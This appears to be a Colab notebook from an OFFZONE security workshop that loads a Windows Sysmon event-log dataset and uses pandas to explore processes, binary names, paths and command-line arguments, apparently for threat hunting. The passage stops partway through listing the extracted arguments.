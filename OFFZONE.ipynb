{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "gpuType": "T4",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/i2z1/Offzone_workshop/blob/main/OFFZONE.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "**Загружаем данные для воркшопа**"
      ],
      "metadata": {
        "id": "EizmqQg9Pc9-"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "!wget https://raw.githubusercontent.com/SadrikA78/offzone/main/data/dataset.csv"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "0cRf-sCt4lIb",
        "outputId": "90281e53-eca1-4dab-b64b-042b352f345b"
      },
      "execution_count": 3,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "--2023-08-24 14:50:55--  https://raw.githubusercontent.com/SadrikA78/offzone/main/data/dataset.csv\n",
            "Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...\n",
            "Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.\n",
            "HTTP request sent, awaiting response... 200 OK\n",
            "Length: 568968 (556K) [text/plain]\n",
            "Saving to: ‘dataset.csv’\n",
            "\n",
            "dataset.csv         100%[===================>] 555.63K  --.-KB/s    in 0.01s   \n",
            "\n",
            "2023-08-24 14:50:55 (37.4 MB/s) - ‘dataset.csv’ saved [568968/568968]\n",
            "\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "**Прочитаем данные (CSV-DataFrame)**"
      ],
      "metadata": {
        "id": "KYdW-yCIVDNM"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import pandas as pd\n",
        "df = pd.read_csv('/content/dataset.csv')"
      ],
      "metadata": {
        "id": "H7zMqEtxPv4A"
      },
      "execution_count": 4,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "**Проверим корректность**"
      ],
      "metadata": {
        "id": "0ahGUE4vZ8nv"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "df"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 634
        },
        "id": "jVr9UOd4WCdW",
        "outputId": "0d7c9964-5506-405e-d7d3-dd6658be677b"
      },
      "execution_count": 5,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "      Unnamed: 0                  UtcTime  ProcessId  EventID  \\\n",
              "0              0  2020-05-12 15:05:19.447       5380        7   \n",
              "1              1  2020-05-12 15:05:19.493       5380       11   \n",
              "2              2  2020-05-12 15:05:19.337       5080       11   \n",
              "3              3  2020-05-12 15:05:17.066       1520        3   \n",
              "4              4  2020-05-12 15:05:13.770          4        3   \n",
              "...          ...                      ...        ...      ...   \n",
              "3707        3767  2020-05-12 14:53:16.220       7544        7   \n",
              "3708        3768  2020-05-12 14:53:16.201       5264        1   \n",
              "3709        3769  2020-05-12 14:53:16.141       7544        7   \n",
              "3710        3770  2020-05-12 14:53:16.126       7544        7   \n",
              "3711        3771  2020-05-12 14:53:16.017       5380        7   \n",
              "\n",
              "                      User                                              Image  \\\n",
              "0                      NaN                            C:\\Windows\\explorer.exe   \n",
              "1                      NaN                            C:\\Windows\\Explorer.EXE   \n",
              "2                      NaN                        C:\\Windows\\system32\\mmc.exe   \n",
              "3     DESKTOP-TATBGQH\\anon  C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\pow...   \n",
              "4      NT AUTHORITY\\SYSTEM                                             System   \n",
              "...                    ...                                                ...   \n",
              "3707                   NaN              C:\\Windows\\System32\\RuntimeBroker.exe   \n",
              "3708   NT AUTHORITY\\SYSTEM                    C:\\Windows\\System32\\svchost.exe   \n",
              "3709                   NaN              C:\\Windows\\System32\\RuntimeBroker.exe   \n",
              "3710                   NaN              C:\\Windows\\System32\\RuntimeBroker.exe   \n",
              "3711                   NaN                            C:\\Windows\\explorer.exe   \n",
              "\n",
              "                                            ImageLoaded  \\\n",
              "0       C:\\Windows\\System32\\Windows.System.Launcher.dll   \n",
              "1                                                   NaN   \n",
              "2                                                   NaN   \n",
              "3                                                   NaN   \n",
              "4                                                   NaN   \n",
              "...                                                 ...   \n",
              "3707                    C:\\Windows\\System32\\mssprxy.dll   \n",
              "3708                                                NaN   \n",
              "3709  C:\\Windows\\System32\\Windows.StateRepositoryPS.dll   \n",
              "3710  C:\\Windows\\System32\\OneCoreUAPCommonProxyStub.dll   \n",
              "3711             C:\\Windows\\System32\\execmodelproxy.dll   \n",
              "\n",
              "                                            CommandLine  \\\n",
              "0                                                   NaN   \n",
              "1                                                   NaN   \n",
              "2                                                   NaN   \n",
              "3                                                   NaN   \n",
              "4                                                   NaN   \n",
              "...                                                 ...   \n",
              "3707                                                NaN   \n",
              "3708  C:\\Windows\\system32\\svchost.exe -k wsappx -p -...   \n",
              "3709                                                NaN   \n",
              "3710                                                NaN   \n",
              "3711                                                NaN   \n",
              "\n",
              "                           ParentImage                 ParentCommandLine  \\\n",
              "0                                  NaN                               NaN   \n",
              "1                                  NaN                               NaN   \n",
              "2                                  NaN                               NaN   \n",
              "3                                  NaN                               NaN   \n",
              "4                                  NaN                               NaN   \n",
              "...                                ...                               ...   \n",
              "3707                               NaN                               NaN   \n",
              "3708  C:\\Windows\\System32\\services.exe  C:\\Windows\\system32\\services.exe   \n",
              "3709                               NaN                               NaN   \n",
              "3710                               NaN                               NaN   \n",
              "3711                               NaN                               NaN   \n",
              "\n",
              "      DestinationPort Protocol QueryName  \\\n",
              "0                 NaN      NaN       NaN   \n",
              "1                 NaN      NaN       NaN   \n",
              "2                 NaN      NaN       NaN   \n",
              "3              8080.0      tcp       NaN   \n",
              "4               137.0      udp       NaN   \n",
              "...               ...      ...       ...   \n",
              "3707              NaN      NaN       NaN   \n",
              "3708              NaN      NaN       NaN   \n",
              "3709              NaN      NaN       NaN   \n",
              "3710              NaN      NaN       NaN   \n",
              "3711              NaN      NaN       NaN   \n",
              "\n",
              "                                         TargetFilename TargetObject  \n",
              "0                                                   NaN          NaN  \n",
              "1     C:\\Users\\anon\\AppData\\Roaming\\Microsoft\\Window...          NaN  \n",
              "2                  C:\\Users\\anon\\Desktop\\xmlEvents2.xml          NaN  \n",
              "3                                                   NaN          NaN  \n",
              "4                                                   NaN          NaN  \n",
              "...                                                 ...          ...  \n",
              "3707                                                NaN          NaN  \n",
              "3708                                                NaN          NaN  \n",
              "3709                                                NaN          NaN  \n",
              "3710                                                NaN          NaN  \n",
              "3711                                                NaN          NaN  \n",
              "\n",
              "[3712 rows x 15 columns]"
            ],
            "text/html": [
              "\n",
              "  <div id=\"df-49a436d3-a6ef-40e3-a69a-59377f3fb739\" class=\"colab-df-container\">\n",
              "    <div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>Unnamed: 0</th>\n",
              "      <th>UtcTime</th>\n",
              "      <th>ProcessId</th>\n",
              "      <th>EventID</th>\n",
              "      <th>User</th>\n",
              "      <th>Image</th>\n",
              "      <th>ImageLoaded</th>\n",
              "      <th>CommandLine</th>\n",
              "      <th>ParentImage</th>\n",
              "      <th>ParentCommandLine</th>\n",
              "      <th>DestinationPort</th>\n",
              "      <th>Protocol</th>\n",
              "      <th>QueryName</th>\n",
              "      <th>TargetFilename</th>\n",
              "      <th>TargetObject</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>0</th>\n",
              "      <td>0</td>\n",
              "      <td>2020-05-12 15:05:19.447</td>\n",
              "      <td>5380</td>\n",
              "      <td>7</td>\n",
              "      <td>NaN</td>\n",
              "      <td>C:\\Windows\\explorer.exe</td>\n",
              "      <td>C:\\Windows\\System32\\Windows.System.Launcher.dll</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>1</th>\n",
              "      <td>1</td>\n",
              "      <td>2020-05-12 15:05:19.493</td>\n",
              "      <td>5380</td>\n",
              "      <td>11</td>\n",
              "      <td>NaN</td>\n",
              "      <td>C:\\Windows\\Explorer.EXE</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>C:\\Users\\anon\\AppData\\Roaming\\Microsoft\\Window...</td>\n",
              "      <td>NaN</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>2</th>\n",
              "      <td>2</td>\n",
              "      <td>2020-05-12 15:05:19.337</td>\n",
              "      <td>5080</td>\n",
              "      <td>11</td>\n",
              "      <td>NaN</td>\n",
              "      <td>C:\\Windows\\system32\\mmc.exe</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>C:\\Users\\anon\\Desktop\\xmlEvents2.xml</td>\n",
              "      <td>NaN</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3</th>\n",
              "      <td>3</td>\n",
              "      <td>2020-05-12 15:05:17.066</td>\n",
              "      <td>1520</td>\n",
              "      <td>3</td>\n",
              "      <td>DESKTOP-TATBGQH\\anon</td>\n",
              "      <td>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\pow...</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>8080.0</td>\n",
              "      <td>tcp</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>4</th>\n",
              "      <td>4</td>\n",
              "      <td>2020-05-12 15:05:13.770</td>\n",
              "      <td>4</td>\n",
              "      <td>3</td>\n",
              "      <td>NT AUTHORITY\\SYSTEM</td>\n",
              "      <td>System</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>137.0</td>\n",
              "      <td>udp</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>...</th>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3707</th>\n",
              "      <td>3767</td>\n",
              "      <td>2020-05-12 14:53:16.220</td>\n",
              "      <td>7544</td>\n",
              "      <td>7</td>\n",
              "      <td>NaN</td>\n",
              "      <td>C:\\Windows\\System32\\RuntimeBroker.exe</td>\n",
              "      <td>C:\\Windows\\System32\\mssprxy.dll</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3708</th>\n",
              "      <td>3768</td>\n",
              "      <td>2020-05-12 14:53:16.201</td>\n",
              "      <td>5264</td>\n",
              "      <td>1</td>\n",
              "      <td>NT AUTHORITY\\SYSTEM</td>\n",
              "      <td>C:\\Windows\\System32\\svchost.exe</td>\n",
              "      <td>NaN</td>\n",
              "      <td>C:\\Windows\\system32\\svchost.exe -k wsappx -p -...</td>\n",
              "      <td>C:\\Windows\\System32\\services.exe</td>\n",
              "      <td>C:\\Windows\\system32\\services.exe</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3709</th>\n",
              "      <td>3769</td>\n",
              "      <td>2020-05-12 14:53:16.141</td>\n",
              "      <td>7544</td>\n",
              "      <td>7</td>\n",
              "      <td>NaN</td>\n",
              "      <td>C:\\Windows\\System32\\RuntimeBroker.exe</td>\n",
              "      <td>C:\\Windows\\System32\\Windows.StateRepositoryPS.dll</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3710</th>\n",
              "      <td>3770</td>\n",
              "      <td>2020-05-12 14:53:16.126</td>\n",
              "      <td>7544</td>\n",
              "      <td>7</td>\n",
              "      <td>NaN</td>\n",
              "      <td>C:\\Windows\\System32\\RuntimeBroker.exe</td>\n",
              "      <td>C:\\Windows\\System32\\OneCoreUAPCommonProxyStub.dll</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3711</th>\n",
              "      <td>3771</td>\n",
              "      <td>2020-05-12 14:53:16.017</td>\n",
              "      <td>5380</td>\n",
              "      <td>7</td>\n",
              "      <td>NaN</td>\n",
              "      <td>C:\\Windows\\explorer.exe</td>\n",
              "      <td>C:\\Windows\\System32\\execmodelproxy.dll</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "<p>3712 rows × 15 columns</p>\n",
              "</div>\n",
              "    <div class=\"colab-df-buttons\">\n",
              "\n",
              "  <div class=\"colab-df-container\">\n",
              "    <button class=\"colab-df-convert\" onclick=\"convertToInteractive('df-49a436d3-a6ef-40e3-a69a-59377f3fb739')\"\n",
              "            title=\"Convert this dataframe to an interactive table.\"\n",
              "            style=\"display:none;\">\n",
              "\n",
              "  <svg xmlns=\"http://www.w3.org/2000/svg\" height=\"24px\" viewBox=\"0 -960 960 960\">\n",
              "    <path d=\"M120-120v-720h720v720H120Zm60-500h600v-160H180v160Zm220 220h160v-160H400v160Zm0 220h160v-160H400v160ZM180-400h160v-160H180v160Zm440 0h160v-160H620v160ZM180-180h160v-160H180v160Zm440 0h160v-160H620v160Z\"/>\n",
              "  </svg>\n",
              "    </button>\n",
              "\n",
              "  <style>\n",
              "    .colab-df-container {\n",
              "      display:flex;\n",
              "      gap: 12px;\n",
              "    }\n",
              "\n",
              "    .colab-df-convert {\n",
              "      background-color: #E8F0FE;\n",
              "      border: none;\n",
              "      border-radius: 50%;\n",
              "      cursor: pointer;\n",
              "      display: none;\n",
              "      fill: #1967D2;\n",
              "      height: 32px;\n",
              "      padding: 0 0 0 0;\n",
              "      width: 32px;\n",
              "    }\n",
              "\n",
              "    .colab-df-convert:hover {\n",
              "      background-color: #E2EBFA;\n",
              "      box-shadow: 0px 1px 2px rgba(60, 64, 67, 0.3), 0px 1px 3px 1px rgba(60, 64, 67, 0.15);\n",
              "      fill: #174EA6;\n",
              "    }\n",
              "\n",
              "    .colab-df-buttons div {\n",
              "      margin-bottom: 4px;\n",
              "    }\n",
              "\n",
              "    [theme=dark] .colab-df-convert {\n",
              "      background-color: #3B4455;\n",
              "      fill: #D2E3FC;\n",
              "    }\n",
              "\n",
              "    [theme=dark] .colab-df-convert:hover {\n",
              "      background-color: #434B5C;\n",
              "      box-shadow: 0px 1px 3px 1px rgba(0, 0, 0, 0.15);\n",
              "      filter: drop-shadow(0px 1px 2px rgba(0, 0, 0, 0.3));\n",
              "      fill: #FFFFFF;\n",
              "    }\n",
              "  </style>\n",
              "\n",
              "    <script>\n",
              "      const buttonEl =\n",
              "        document.querySelector('#df-49a436d3-a6ef-40e3-a69a-59377f3fb739 button.colab-df-convert');\n",
              "      buttonEl.style.display =\n",
              "        google.colab.kernel.accessAllowed ? 'block' : 'none';\n",
              "\n",
              "      async function convertToInteractive(key) {\n",
              "        const element = document.querySelector('#df-49a436d3-a6ef-40e3-a69a-59377f3fb739');\n",
              "        const dataTable =\n",
              "          await google.colab.kernel.invokeFunction('convertToInteractive',\n",
              "                                                    [key], {});\n",
              "        if (!dataTable) return;\n",
              "\n",
              "        const docLinkHtml = 'Like what you see? Visit the ' +\n",
              "          '<a target=\"_blank\" href=https://colab.research.google.com/notebooks/data_table.ipynb>data table notebook</a>'\n",
              "          + ' to learn more about interactive tables.';\n",
              "        element.innerHTML = '';\n",
              "        dataTable['output_type'] = 'display_data';\n",
              "        await google.colab.output.renderOutput(dataTable, element);\n",
              "        const docLink = document.createElement('div');\n",
              "        docLink.innerHTML = docLinkHtml;\n",
              "        element.appendChild(docLink);\n",
              "      }\n",
              "    </script>\n",
              "  </div>\n",
              "\n",
              "\n",
              "<div id=\"df-d886071c-c148-4460-8d06-c358ef5d90ed\">\n",
              "  <button class=\"colab-df-quickchart\" onclick=\"quickchart('df-d886071c-c148-4460-8d06-c358ef5d90ed')\"\n",
              "            title=\"Suggest charts.\"\n",
              "            style=\"display:none;\">\n",
              "\n",
              "<svg xmlns=\"http://www.w3.org/2000/svg\" height=\"24px\"viewBox=\"0 0 24 24\"\n",
              "     width=\"24px\">\n",
              "    <g>\n",
              "        <path d=\"M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zM9 17H7v-7h2v7zm4 0h-2V7h2v10zm4 0h-2v-4h2v4z\"/>\n",
              "    </g>\n",
              "</svg>\n",
              "  </button>\n",
              "\n",
              "<style>\n",
              "  .colab-df-quickchart {\n",
              "    background-color: #E8F0FE;\n",
              "    border: none;\n",
              "    border-radius: 50%;\n",
              "    cursor: pointer;\n",
              "    display: none;\n",
              "    fill: #1967D2;\n",
              "    height: 32px;\n",
              "    padding: 0 0 0 0;\n",
              "    width: 32px;\n",
              "  }\n",
              "\n",
              "  .colab-df-quickchart:hover {\n",
              "    background-color: #E2EBFA;\n",
              "    box-shadow: 0px 1px 2px rgba(60, 64, 67, 0.3), 0px 1px 3px 1px rgba(60, 64, 67, 0.15);\n",
              "    fill: #174EA6;\n",
              "  }\n",
              "\n",
              "  [theme=dark] .colab-df-quickchart {\n",
              "    background-color: #3B4455;\n",
              "    fill: #D2E3FC;\n",
              "  }\n",
              "\n",
              "  [theme=dark] .colab-df-quickchart:hover {\n",
              "    background-color: #434B5C;\n",
              "    box-shadow: 0px 1px 3px 1px rgba(0, 0, 0, 0.15);\n",
              "    filter: drop-shadow(0px 1px 2px rgba(0, 0, 0, 0.3));\n",
              "    fill: #FFFFFF;\n",
              "  }\n",
              "</style>\n",
              "\n",
              "  <script>\n",
              "    async function quickchart(key) {\n",
              "      const charts = await google.colab.kernel.invokeFunction(\n",
              "          'suggestCharts', [key], {});\n",
              "    }\n",
              "    (() => {\n",
              "      let quickchartButtonEl =\n",
              "        document.querySelector('#df-d886071c-c148-4460-8d06-c358ef5d90ed button');\n",
              "      quickchartButtonEl.style.display =\n",
              "        google.colab.kernel.accessAllowed ? 'block' : 'none';\n",
              "    })();\n",
              "  </script>\n",
              "</div>\n",
              "    </div>\n",
              "  </div>\n"
            ]
          },
          "metadata": {},
          "execution_count": 5
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Новый раздел"
      ],
      "metadata": {
        "id": "sFbhZk-HCu-w"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "**Предварительный просмотр**"
      ],
      "metadata": {
        "id": "Jkdsx_LLaCEG"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "df.info()"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "LC5e-AohYirp",
        "outputId": "a5e621f4-052f-4ad7-ad36-bd35b42e5c27"
      },
      "execution_count": 6,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "<class 'pandas.core.frame.DataFrame'>\n",
            "RangeIndex: 3712 entries, 0 to 3711\n",
            "Data columns (total 15 columns):\n",
            " #   Column             Non-Null Count  Dtype  \n",
            "---  ------             --------------  -----  \n",
            " 0   Unnamed: 0         3712 non-null   int64  \n",
            " 1   UtcTime            3712 non-null   object \n",
            " 2   ProcessId          3712 non-null   int64  \n",
            " 3   EventID            3712 non-null   int64  \n",
            " 4   User               331 non-null    object \n",
            " 5   Image              3712 non-null   object \n",
            " 6   ImageLoaded        3110 non-null   object \n",
            " 7   CommandLine        60 non-null     object \n",
            " 8   ParentImage        60 non-null     object \n",
            " 9   ParentCommandLine  60 non-null     object \n",
            " 10  DestinationPort    271 non-null    float64\n",
            " 11  Protocol           271 non-null    object \n",
            " 12  QueryName          104 non-null    object \n",
            " 13  TargetFilename     157 non-null    object \n",
            " 14  TargetObject       10 non-null     object \n",
            "dtypes: float64(1), int64(3), object(11)\n",
            "memory usage: 435.1+ KB\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "len(df.ProcessId.value_counts().index)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "aGAjVrb2ald-",
        "outputId": "5f609509-a1ec-4cd9-80da-5ccd554502f8"
      },
      "execution_count": 8,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "93"
            ]
          },
          "metadata": {},
          "execution_count": 8
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "len(df.ProcessId.value_counts()[df.ProcessId.value_counts() > 5].index)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "0F7CH3U2avgz",
        "outputId": "d369fc4e-ae16-43ef-85aa-7f8ddc2dd1fe"
      },
      "execution_count": 10,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "79"
            ]
          },
          "metadata": {},
          "execution_count": 10
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "df.ProcessId.value_counts()[0:10]"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "M7B7Shkba8TC",
        "outputId": "ac9f5952-7337-4859-e89d-0634f22bb993"
      },
      "execution_count": 9,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "1520     284\n",
              "9716     168\n",
              "9116     163\n",
              "3748     114\n",
              "10116    110\n",
              "9308     107\n",
              "4556      97\n",
              "1532      90\n",
              "4752      90\n",
              "7584      89\n",
              "Name: ProcessId, dtype: int64"
            ]
          },
          "metadata": {},
          "execution_count": 9
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "**Предобработка**"
      ],
      "metadata": {
        "id": "IFChX-xFcejO"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "newdf = df[~df.ProcessId.isna()]\n",
        "newdf.drop(newdf[newdf.EventID == '5'].index, inplace=True)"
      ],
      "metadata": {
        "id": "ZslUJWfVceGg"
      },
      "execution_count": 11,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "1. Исходники и пути"
      ],
      "metadata": {
        "id": "Nqas7KcEdjyi"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "newdf['binary'] = newdf.Image.str.split(r'\\\\').apply(lambda x: x[-1].lower())\n",
        "newdf['binary'].unique()"
      ],
      "metadata": {
        "id": "B03p98VkbHWU",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "14c0a7b9-1743-40c9-d18b-f182afc59fb3"
      },
      "execution_count": 12,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "array(['explorer.exe', 'mmc.exe', 'powershell.exe', 'system',\n",
              "       'sysmon.exe', 'fsatps.exe', 'searchui.exe',\n",
              "       'startmenuexperiencehost.exe', 'svchost.exe', 'fsatpn.exe',\n",
              "       'fshoster32.exe', 'calculator.exe', 'backgroundtaskhost.exe',\n",
              "       'fsorsp64.exe', 'runtimebroker.exe', 'dllhost.exe',\n",
              "       'applicationframehost.exe', 'notepad.exe', 'wmiprvse.exe',\n",
              "       'netstat.exe', 'tiworker.exe', 'trustedinstaller.exe',\n",
              "       'services.exe', 'conhost.exe', 'wmiapsrv.exe', 'taskhostw.exe',\n",
              "       'wsqmcons.exe', 'microsoftedge.exe', 'localbridge.exe',\n",
              "       'microsoftedgecp.exe', 'microsoftedgesh.exe', 'browser_broker.exe',\n",
              "       'katz.exe', 'schtasks.exe', 'fshoster64.exe', 'fodhelper.exe',\n",
              "       'consent.exe', 'whoami.exe', 'systeminfo.exe', 'smartscreen.exe',\n",
              "       'wscript.exe', 'searchfilterhost.exe'], dtype=object)"
            ]
          },
          "metadata": {},
          "execution_count": 12
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "newdf['path'] = newdf.Image.str.split(r'\\\\').apply(lambda x: '\\\\'.join(x[:-1]).lower())\n",
        "newdf['path'].unique()"
      ],
      "metadata": {
        "id": "Qg60wJdVdo7Q",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "bfce6a25-5c7f-4b7b-e585-2b75d341bc36"
      },
      "execution_count": 13,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "array(['c:\\\\windows', 'c:\\\\windows\\\\system32',\n",
              "       'c:\\\\windows\\\\system32\\\\windowspowershell\\\\v1.0', '',\n",
              "       'c:\\\\program files (x86)\\\\f-secure\\\\psb\\\\ultralight\\\\sensor\\\\1585128330',\n",
              "       'c:\\\\windows\\\\systemapps\\\\microsoft.windows.cortana_cw5n1h2txyewy',\n",
              "       'c:\\\\windows\\\\systemapps\\\\microsoft.windows.startmenuexperiencehost_cw5n1h2txyewy',\n",
              "       'c:\\\\program files (x86)\\\\f-secure\\\\psb',\n",
              "       'c:\\\\program files\\\\windowsapps\\\\microsoft.windowscalculator_10.1910.0.0_x64__8wekyb3d8bbwe',\n",
              "       'c:\\\\program files (x86)\\\\f-secure\\\\psb\\\\ultralight\\\\ulcore\\\\1585820217',\n",
              "       'c:\\\\windows\\\\system32\\\\wbem',\n",
              "       'c:\\\\windows\\\\winsxs\\\\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3',\n",
              "       'c:\\\\windows\\\\servicing',\n",
              "       'c:\\\\windows\\\\systemapps\\\\microsoft.microsoftedge_8wekyb3d8bbwe',\n",
              "       'c:\\\\program files\\\\windowsapps\\\\microsoft.microsoftofficehub_18.2002.1101.0_x64__8wekyb3d8bbwe',\n",
              "       'c:\\\\windows\\\\system32\\\\katz'], dtype=object)"
            ]
          },
          "metadata": {},
          "execution_count": 13
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "2. Аргументы cmd\n"
      ],
      "metadata": {
        "id": "BjMhUMv_eYt3"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "newdf['arguments'] = newdf.CommandLine.fillna('empty').str.split().apply(lambda x: ' '.join(x[1:]))\n",
        "newdf['arguments'].unique()"
      ],
      "metadata": {
        "id": "MvdtgZlweaU7",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "a42303de-b496-4fce-9031-d32630537141"
      },
      "execution_count": 14,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "array(['', '-k wsappx -p -s AppXSvc',\n",
              "       '-ServerName:CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca',\n",
              "       '-Embedding', '/Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}',\n",
              "       'Files\\\\WindowsApps\\\\Microsoft.WindowsCalculator_10.1910.0.0_x64__8wekyb3d8bbwe\\\\Calculator.exe\" -ServerName:App.AppXsm3pg4n7er43kdh1qp4e79f1j7am68r8.mca',\n",
              "       '-k BcastDVRUserService -s BcastDVRUserService', '-ano',\n",
              "       '0xffffffff -ForceV1',\n",
